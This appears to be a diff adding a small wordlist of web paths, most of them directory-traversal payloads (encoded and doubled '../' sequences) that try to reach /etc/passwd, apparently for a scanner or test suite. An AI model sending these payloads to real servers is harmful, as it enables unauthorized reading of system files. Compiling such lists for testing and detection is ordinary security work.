@@ -1,0 +1,6 @@
+/umweb/passwd
+/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+/lib///....//....//....//....//....//....//....//....//etc//passwd
+
+/cgi-bin/main.cgi
+/umweb/../etc/passwd
